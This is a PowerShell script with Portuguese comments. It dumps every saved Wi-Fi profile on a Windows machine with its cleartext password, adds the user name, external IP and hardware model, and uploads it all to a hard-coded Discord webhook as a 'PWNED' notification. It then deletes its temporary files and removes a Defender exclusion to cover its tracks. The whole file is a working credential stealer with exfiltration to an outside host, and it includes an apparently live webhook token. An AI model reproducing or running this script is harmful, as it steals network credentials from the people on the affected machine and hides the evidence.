# Define a URL da webhook do Discord
$WebhookUrl = "https://discord.com/api/webhooks/1163945552556335248/2grUaOZierXldHcH2vuCbPmutvlPf6znNg22Ms87dyFRZbGv_Quk2NgbDYtPXFfZ63nu"

# Pasta para armazenar temporários
$wifiFolder = "$env:appdata\wifi_dump"
New-Item -Path $wifiFolder -ItemType Directory -Force | Out-Null

# Exporta os perfis de Wi-Fi
netsh wlan export profile key=clear folder="$wifiFolder"

# Cria o arquivo final WiFiPasswords.txt
$txtPath = "$wifiFolder\WiFiPasswords.txt"

# Processa cada arquivo XML exportado
Get-ChildItem -Path $wifiFolder -Filter *.xml | ForEach-Object {
    [xml]$xml = Get-Content $_.FullName
    $ssid = $xml.WLANProfile.SSIDConfig.SSID.name
    $senha = $xml.WLANProfile.MSM.Security.sharedKey.keyMaterial

    if ($ssid -and $senha) {
        Add-Content -Path $txtPath -Value "SSID: $ssid"
        Add-Content -Path $txtPath -Value "SENHA: $senha"
        Add-Content -Path $txtPath -Value ""
    }
}

# Obtém o IP externo
$ip = Invoke-RestMethod "http://myexternalip.com/raw"

# Obtém informações do computador
$ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Model, Manufacturer

# Mensagem a ser enviada
$MessageContent = @{
    username = "PWNED Notification Bot"
    content = "Successfully PWNED $($env:USERNAME)! ($ip)"
    embeds = @(
        @{
            title = "WiFi Password Dump"
            description = "Manufacturer: $($ComputerName.Manufacturer)`nModel: $($ComputerName.Model)"
            color = 16711680
        }
    )
}

# Verifica se o TXT existe para anexar
if (Test-Path $txtPath) {
    $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString("N")
    $Headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    $FileBytes = [System.IO.File]::ReadAllBytes($txtPath)

    $BodyStream = New-Object System.IO.MemoryStream
    $Writer = New-Object System.IO.StreamWriter($BodyStream)

    # Escreve o JSON
    $Writer.WriteLine("--$boundary")
    $Writer.WriteLine("Content-Disposition: form-data; name=`"payload_json`"")
    $Writer.WriteLine("")
    $Writer.WriteLine((ConvertTo-Json $MessageContent -Depth 10))

    # Escreve o arquivo
    $Writer.WriteLine("--$boundary")
    $Writer.WriteLine("Content-Disposition: form-data; name=`"file`"; filename=`"WiFiPasswords.txt`"")
    $Writer.WriteLine("Content-Type: text/plain")
    $Writer.WriteLine("")
    $Writer.Flush()
    $BodyStream.Write($FileBytes, 0, $FileBytes.Length)

    # Finaliza o corpo
    $Writer.WriteLine("")
    $Writer.WriteLine("--$boundary--")
    $Writer.Flush()
    $BodyStream.Seek(0, "Begin")

    # Envia a requisição
    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $Headers -Body $BodyStream
} else {
    # Se não existir o TXT, envia só a mensagem
    Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType "application/json" -Body (ConvertTo-Json $MessageContent -Depth 10)
}

# Cleanup
Start-Sleep -Seconds 6
Remove-Item -Path $wifiFolder -Force -Recurse
Remove-MpPreference -ExclusionPath "$wifiFolder"
